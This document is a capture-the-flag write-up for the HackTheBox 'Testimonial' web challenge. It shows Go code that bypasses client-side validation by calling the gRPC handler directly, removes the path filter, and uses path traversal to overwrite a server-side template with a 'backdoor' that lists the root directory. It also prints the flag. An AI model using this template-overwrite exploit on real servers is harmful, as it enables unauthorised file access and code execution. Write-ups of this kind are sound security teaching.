# Testimonial

 As the leader of the Revivalists you are determined to take down the KORP, you
 and the best of your faction's hackers have set out to deface the official
 KORP website to send them a message that the revolution is closing in.

## How to Play

Two URLs are provided, one for the KORP website and the other for grpc handler.

The input validation happens on the website, so by creating a client that
directly connects to the GRPC handler, we can bypass the input validation.

The website uses `air` to generate a template using `templ`.

```toml
cmd = "templ generate && go build -o ./tmp/main ."
```

In the `challenge/view/home/index.templ` file these lines are present:

```go
fsys := os.DirFS("public/testimonials")
files, err := fs.ReadDir(fsys, ".")
```

This is a go code that reads the files in the `public/testimonials` directory.
And this code executes on the server side according to `air` and by `templ`.

We aim to replace the `public/testimonials` directory with `/` to read the root
directory and the contents of the root directory.

We can copy GRPC client used by web server and modify it to read the root
directory.


Modify the `challenge/view/home/index.templ` to read the root directory.
and save it as `solve.templ`.

```go
fsys := os.DirFS("/")
```

Create a new main `main.go` with goal of calling the `SendTestimonial` function
with the modified `templ` file. We can use the `challenge/client/client.go` as
a template.

First change the `url` to the GRPC handler. (change the ip and port)

```go
conn, err := grpc.Dial(fmt.Sprintf("127.0.0.1%s", ":50045"), grpc.WithInsecure())
```

Then remove the filter bad characters in `SendTestimonial` function.

```go
// Filter bad characters.
// for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
// 	customer = strings.ReplaceAll(customer, char, "")
// }
```

Then call the `SendTestimonial` function with the modified `templ` file.

```go
func main () {
	client, _ := GetClient()

	backdoor, _ := ioutil.ReadFile("./solve.templ")

	client.SendTestimonial("../../view/home/index.templ", string(backdoor))
}
```

[main.go](web_testimonial/web_testimonial/challenge/main.go)
[solve.templ](web_testimonial/web_testimonial/challenge/solve.templ)

Reloading the website will show all the contents of the root directory.

## Flag

```
HTB{w34kly_t35t3d_t3mplate5}
```
